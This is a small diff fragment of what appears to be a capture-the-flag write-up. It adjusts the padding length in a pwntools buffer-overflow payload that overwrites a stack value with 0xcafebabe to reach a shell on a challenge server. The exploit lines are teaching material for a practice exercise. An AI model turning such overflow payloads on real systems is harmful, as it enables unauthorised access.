@@ -87,7 +87,7 @@ To enter the bash on the server, we can use `pwntools` once again:
 ```python
 from pwn import *
 
-padding = "A" * 52
+padding = "A" * 48
 key = "\xbe\xba\xfe\xca"
 payload = padding + key
 
